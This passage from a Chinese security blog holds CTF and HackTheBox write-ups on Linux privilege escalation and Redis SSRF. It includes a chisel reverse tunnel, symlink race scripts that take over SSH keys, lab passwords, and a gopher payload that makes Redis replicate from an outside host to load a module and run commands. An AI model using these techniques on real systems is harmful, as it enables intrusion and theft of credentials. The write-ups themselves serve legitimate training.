class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/escpos-php/vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mike42</span>\<span class="title">Escpos</span>\<span class="title">PrintConnectors</span>\<span class="title">NetworkPrintConnector</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mike42</span>\<span class="title">Escpos</span>\<span class="title">Printer</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"db.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">"loggedin"</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$title=$_POST[<span class="string">"title"</span>];</span><br><span class="line">$file = date(<span class="string">"Y-m-d_H:i:s"</span>);</span><br><span class="line">file_put_contents(<span class="string">"/var/www/jobs/"</span>.$file,$_POST[<span class="string">"desc"</span>]);</span><br><span class="line">chmod(<span class="string">"/var/www/printer/jobs/"</span>.$file,<span class="string">"0777"</span>);</span><br><span class="line">$stmt=$conn-&gt;prepare(<span class="string">"select ip,port from jobs"</span>);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result=$stmt-&gt;get_result();</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$row=$result-&gt;fetch_assoc();</span><br><span class="line">$ip=$row[<span class="string">"ip"</span>];</span><br><span class="line">$port=$row[<span class="string">"port"</span>];</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">$connector = <span class="keyword">new</span> NetworkPrintConnector($ip,$port);</span><br><span class="line">sleep(<span class="number">0.5</span>); <span class="comment">//Buffer for socket check</span></span><br><span class="line">$printer = <span class="keyword">new</span> Printer($connector);</span><br><span class="line">$printer -&gt; text(file_get_contents(<span class="string">"/var/www/jobs/"</span>.$file));</span><br><span class="line">$printer -&gt; cut();</span><br><span class="line">$printer -&gt; close();</span><br><span class="line">$message=<span class="string">"Job assigned"</span>;</span><br><span class="line">unlink(<span class="string">"/var/www/jobs/"</span>.$file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $error) </span><br><span class="line">&#123;</span><br><span class="line">$error=<span class="string">"Can't connect to printer."</span>;</span><br><span class="line">unlink(<span class="string">"/var/www/jobs/"</span>.$file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$error=<span class="string">"Couldn't find printer."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Invalid Username/Password");window.location.href="index.php";&lt;/script&gt;'</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中用到的框架的部分经搜索后发现只是一个类似‘打印’功能的框架。比如<code>NetworkPrintConnector</code>就是调用了一个<code>fsockopen()</code>。</p><p>接下来的部分就是最让我头疼的部分。很大程度上是经验不足吧。现在既然要提权，并且有存在漏洞的web服务了，那么它肯定得是<code>srvadm</code>运行的，才能让我有提权机会。然而我在找服务这里却浪费了很多时间：开始看端口发现有80端口，于是直接<code>curl</code>.得到的却是之前9001端口的php+esigate页面。导致我以为80端口运行的是nginx给java做的反代。之后把靶机端口全过了一遍也没有找到哪个端口是跑的printer的web服务。甚至也没找到srvadm在运行什么服务的信息。导致自己瞬间迷茫。</p><p>之后在这块询问了下外国友人<code>bigFish43</code>。他给我的提示是查看下apache的config文件。于是思路瞬间明朗起来。<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/7.PNG" alt><br>在<code>sites-enabled/000-default.conf</code>里找到了子域名<code>printerv2.quick.htb</code>并且正如所预料的，是以srvadm用户运行的。</p><p>apache的<code>virtualhost</code>跑在80端口上。不过同时我们知道html文件夹里的的服务也跑在80端口上。那么需要更改Host才能访问<br>靶机上<br><code>curl localhost -H &#39;Host: printerv2.quick.htb&#39;</code>后终于得到了来自printer的回显。那么下一步就是，为了直接在本地访问到printerv2.quick.htb，必须要进行端口转发了。因为我们最早nmap探测80端口时是没有开启的。说明这里apache服务是运行在本地的。</p><p>转发端口同样也有至少两种方法。ssh或者上工具<code>chisel</code>。这里我没有用ssh登录，所以直接用<code>chisel</code>。chisel之前做sniper也用过了。这里直接留传完chisel后的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kali</span></span><br><span class="line">./chisel_linux_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line"><span class="comment">#sam@quick</span></span><br><span class="line">./chisel_linux_amd64 client 10.10.14.40:8000 R:80:127.0.0.1:80</span><br></pre></td></tr></table></figure><p>意思就是，靶机借用8000端口的中转，把靶机的80端口转到kali的127.0.0.1:80即本地80端口.</p><p>这样就把80端口转发到本地了。接下来由于要修改hostname。因为不想影响访问之前的网址。直接开个burp来修改Host header.<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/8.PNG" alt><br>只要保持burp打开，我们每次访问的Host都会被替换.<br>即可在本地访问进行操作。<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/9.PNG" alt></p><p>接下来就是渗透的难点了。前面提到说job.php看起来有漏洞，但究竟漏洞在哪？开始我觉得有漏洞是因为里面出现了<code>chmod(xxx,777)</code>。但仔细一看却发现那个<code>/var/www/printer/jobs</code>路径不存在？既然如此，代码逻辑就是：</p><ul><li>接受我们post的参数，执行<code>file_put_contents()</code>在<code>/var/www/jobs</code>写入一个文件名为当前日期的文件。并且chmod一个不存在的文件。</li><li>执行sql查询。假如jobs库里有内容。按照查询结果远程连接到对应的ip,port.sleep(0.5)后执行<code>file_get_contents()</code>读我们之前的文件，并最后删除;jobs库无内容直接退出。</li></ul><p>这里卡了好久后我突然想起来<code>/var/www/jobs</code>文件夹是777权限。那么我们可以写文件这点就非常重要。于是立刻就有了两种使用短链接的条件竞争</p><ul><li><p>不要在数据库中插入新数据。这样srvadm创建的文件就会留下来。如果我们提前创建一个同名文件(因为文件名为时间这点是可预测的)。并利用<strong>短链接</strong>将其链接向srvadm的sshkey.那么执行<code>file_put_contents()</code>时不就可以写入我们自己的公钥了吗？</p></li><li><p>在前面printer.php就输入host跟port.即在数据库插入数据。这样job.php就会进行读文件并打印内容。而我们可以用nc接收。只要在写文件跟读文件的间隔中删掉文件并建立一个到ssh私钥的<strong>短链接</strong>。php就会把读到的私钥发给我们。</p></li></ul><p>这里两种思路同时想到，我立刻选择了前者。因为后者算比较纯粹的条件竞争,时间不好把控(所以叫<code>Quick</code>)，我选择前者。</p><p>操作起来比想象中简单。我一次就成了。假如同时做靶机的人比较多的话就另谈，<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/10.PNG" alt><br>其实就是算好一个提前量。并且执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/srvadm/.ssh/authorized_keys 2020-06-23_06:00:00</span><br></pre></td></tr></table></figure><p>然后差不多算好时间提前burp重复发包。<br>这里因为精度被限制在1s.所以写入我们的key的可能性不小。</p><p>之后直接ssh登录即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa srvadm@10.10.10.186</span><br></pre></td></tr></table></figure><p>这里我虽然没试第二种思路，但做完靶机后看到其他人的wp里写到了解决方法:</p><p>执行一个bashscript</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;jobs;</span><br><span class="line">while true;</span><br><span class="line">do</span><br><span class="line">        for file in $(ls .);</span><br><span class="line">        do</span><br><span class="line">                rm -rf $file;</span><br><span class="line">                ln -s &#x2F;home&#x2F;srvadm&#x2F;.ssh&#x2F;id_rsa $file;</span><br><span class="line">        done</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>然后起一个nc监听。并在job.php提交内容写入。这样就能得到私钥并且直接登录了。</p><p>这段内容其实花的时间不比第一部分少。甚至于我遇到的困难更多。比如在找服务上太傻了。之后想起运行pspy64s时也发现了系统是有apache服务跑着的。那肯定就得去找配置文件。结果自己只看了apache的<code>apache2.conf</code>就了事了。该打。然后就是后面的漏洞利用。那个chmod着实害人，开始还想着把短链接链到那个不存在的文件。仔细一想才发现其实直接链到key就可了。</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>到root的部分才是真正的<code>Quick</code>。只需要待在自己的home文件夹进行enum即可。</p><p>这里按照sshkey的创建时间，找一下3-21之前一个月不到的文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">srvadm@quick:/home/srvadm<span class="comment"># find . -type f -newermt "2020-03-01" ! -newermt "2020-03-21" -ls 2&gt;/dev/null</span></span><br><span class="line">   281794      4 -rw-r--r--   1 srvadm   srvadm       4038 Mar 20 06:23 ./.cache/conf.d/printers.conf</span><br><span class="line">   281793      8 -rw-r--r--   1 srvadm   srvadm       4569 Mar 20 06:20 ./.cache/conf.d/cupsd.conf</span><br><span class="line">   281799     72 -rw-rw-r--   1 srvadm   srvadm      71479 Mar 20 06:46 ./.cache/logs/debug.log</span><br><span class="line">   281798      4 -rw-rw-r--   1 srvadm   srvadm       1136 Mar 20 06:39 ./.cache/logs/error.log</span><br><span class="line">   281791     12 -rw-r--r--   1 srvadm   srvadm       9064 Mar 20 06:19 ./.cache/logs/cups.log</span><br><span class="line">   281425      0 -rw-r--r--   1 srvadm   srvadm          0 Mar 20 02:38 ./.cache/motd.legal-displayed</span><br><span class="line">   281369      4 -rw-r--r--   1 srvadm   srvadm        220 Mar 20 02:16 ./.bash_logout</span><br><span class="line">   281797      4 -rw-------   1 srvadm   srvadm         23 Mar 20 06:46 ./.<span class="built_in">local</span>/share/nano/search_history</span><br><span class="line">   281421      4 -rw-r--r--   1 srvadm   srvadm        222 Mar 20 02:38 ./.ssh/known_hosts</span><br><span class="line">   281418      4 -rw-------   1 srvadm   srvadm       1679 Mar 20 02:37 ./.ssh/id_rsa</span><br><span class="line">   281419      4 -rw-r--r--   1 srvadm   srvadm        394 Mar 20 02:37 ./.ssh/id_rsa.pub</span><br><span class="line">   281370      4 -rw-r--r--   1 srvadm   srvadm       3771 Mar 20 02:16 ./.bashrc</span><br><span class="line">   281371      4 -rw-r--r--   1 srvadm   srvadm        807 Mar 20 02:16 ./.profile</span><br></pre></td></tr></table></figure><p>一个个读后发现关键信息在<br>./.cache/conf.d/printers.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeviceURI https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer</span><br></pre></td></tr></table></figure><p>之前学ssrf时总结过url的属性。<code>username:password@host</code>的格式告诉了我们<code>&amp;ftQ4K3SGde8?</code>密码。所以直接尝试su到root。直接拿到rootshell.</p><p>ssh也是同样<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/11.PNG" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>本次渗透前后花了不少时间。相比之前看ippsec视频做退役靶机,独立完成一台困难靶机真的感觉很不错，也很艰辛。当然，能完整做完很大程度上是因为这台靶机的内容很适合CTF的web选手。自己在很多地方也都运用到了自己日常比赛时的小技能。同时靶机关于http/3,xslt-&gt;RCE,提权方法等等都有很大收获。所以非常赞。</p><p>其实前前后后做了快20多台HTB靶机,感觉自己经常卡在<code>enumeration</code>也就是枚举(信息收集)上。而这往往是解决问题的关键。希望能够多锻炼下自己这方面的能力吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探Redis-wdb玄武组ssrfme&amp;pwnhub公开赛</title>
      <link href="2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&amp;pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&amp;pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<ul><li>本学期最后一篇文章。写完就要复习去了。</li></ul><p>文章写在RCTF第一天。web狗真实自闭.本来想把假期前最后一篇文章留给RCTFwp的。现在看都不用写了,反正只会一道。原先听说过ROIS的web很强，zsx大师傅是巨佬，没想到恐怖如斯。(这就是ROIS跟zsx的可怕之处吗,怕了怕了)</p><p>所以比赛第一天留意到有个pwnhub公开赛，于是就去水了下，好歹是拿了个邀请码。这题因为是redis相关，联想到之前网鼎杯玄武的那道redis，加上自己原来基本没做过redis题，打算把这两道题相关知识点都总结下，当做这学期的收尾吧。</p><a id="more"></a><h2 id="网鼎杯玄武组ssrfme"><a href="#网鼎杯玄武组ssrfme" class="headerlink" title="网鼎杯玄武组ssrfme"></a>网鼎杯玄武组ssrfme</h2><p>这题真没想到，是郁师傅出的题……网上大部分做法都是主从复制RCE做的，不过郁师傅说试试不用主从复制做,不知道是什么姿势。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">        safe_request_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally. </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先拿到题目是经典的yulige标配ssrf。可以看到,我们允许使用的scheme是http,gopher以及dict。然后需要绕过一个内网ip检测，即可进行curl的ssrf.</p><p>看到提示说访问hint.php。看来需要绕过ip限制进行内网访问。这个点之前总结ssrf时提到过,算是基本trick了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure><p><code>0.0.0.0</code>默认本地。<code>@</code>则是因为phpparse_url只会匹配到最后一个<code>@</code>后的内容的原因。这样我们就可以绕过了。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" alt></p><p>得到一个redis密码。下面是试图得到webshell</p><p>通常来说ssrf+redis getshell主要是这几种姿势</p><ol><li>可写webshell。</li><li>写ssh公钥</li><li>写crontab反弹shell(仅限centos)</li><li>主从复制RCE</li></ol><p>这里最简单的是可写webshell的情况。具体上就跟之前GKCTF那题一样，payload编码好就能用gopher打。</p><p>此处虽然是php,但是并不能写webshell。剩下的当然是更不可能的。因为没有ssh跟crontab服务。那么值得一试的就是主从复制RCE了</p><p>详细知识可以去看郁师傅在xray社区发的redis安全学习小记。</p><p>主从复制，主要利用的就是redis<code>SLAVE OF</code>的命令，将一台redis的数据复制到另一台。前者为主节点，后者为从节点。这个复制过程是单向的。</p><p>而我们redis主从复制RCE的方式，其实就是利用了redis简洁的协议，构造恶意服务器，将原本用于存储备份的rdb文件,替换为我们恶意的exp.so。这样节点redis中就会自动生成exp.so，使得我们可以用load_module进行rce.</p><p>需要注意的是,因为利用redis写文件的方式写入exp.so会因为redis的大量无用数据padding影响其正常使用。而我们利用主从复制上传so，主要用到的是web应用层面的上传。而php默认的www-data是644,拥有只读权限。实战中是完全可以结合上传攻击的。</p><p>因此本题只要用到两个两个工具即可<br><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>前者用于生成payload，同时也可启动恶意server。后者主要是exp.so。建议把exp.so直接拷到前面文件夹下就行了。</p><p>然后我们设置对应的payload。修改<code>ssrf-redis.py</code>在默认的rce模式下,只要改命令，lhost,lport,密码即可。然后启动恶意服务器。用前面生成好的payload直接打。<br><code>url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code><br>第一次打会建立好主从复制。这时候就可以关掉server直接用ssrf命令进行RCE了。</p><p><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" alt></p><h2 id="pwnhub公开赛-七爪鱼-flag在线爬取系统"><a href="#pwnhub公开赛-七爪鱼-flag在线爬取系统" class="headerlink" title="pwnhub公开赛-七爪鱼 flag在线爬取系统"></a>pwnhub公开赛-七爪鱼 flag在线爬取系统</h2><p>这次做题本来是因为被RCTF虐惨了跑去看看的。结果难度似乎适中。刚好给我一点点满足感。</p><p>首先题目server是gunicorn的配置。这个从header中可以看出来。然后注册登录后发现有一个爬虫<code>/spider</code>路由。拿<code>file:///etc/passwd</code>打一发可以读到/etc/passwd.看来又是个ssrf。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" alt><br>同时注意到用户里有redis-db跟server.看来是有redis了。</p><p>简单探测下发现6379端口有redis的报错回显。</p><p>第一反应先读了下bash_history。发现一个没权限一个不存在。(假如能用这种方式知道根目录flag的名称那就会简便很多，这也是我在wustctf当时直接读到flag的非预期思路)</p><p>然后期间触发了报错。发现是python的urllib库调用的urlopen。这个库熟悉的话应该都知道是存在CRLF的洞的。我们可以用这个ssrf往自己服务器打一波。nc监听的话会发现是python3.5的urllib。</p><p>对urllib的ssrf,用http协议下的可以直接打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apadding</span><br><span class="line">只返回$-1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aconfig%20set%20dir%20&#x2F;tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apadding</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;tmp&#x2F;byc</span><br><span class="line">成功写入文件</span><br></pre></td></tr></table></figure><p>那么此时大致确认可以用这个ssrf打redis了。但是要注意的是我们python服务器不能直接写webshell。不能写定时和key。而且由于gopher不支持也不能进行RCE。换言之我们只能对redis进行命令操作。所以我想先尝试探测源码信息</p><p>首先是<code>/proc/self/cmdline</code>。读到了gunicorn的相关配置。</p><p><code>/usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app</code></p><p>得到run.py。这里直接用<code>/proc/self/cwd/run.py</code>去读工作目录下的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 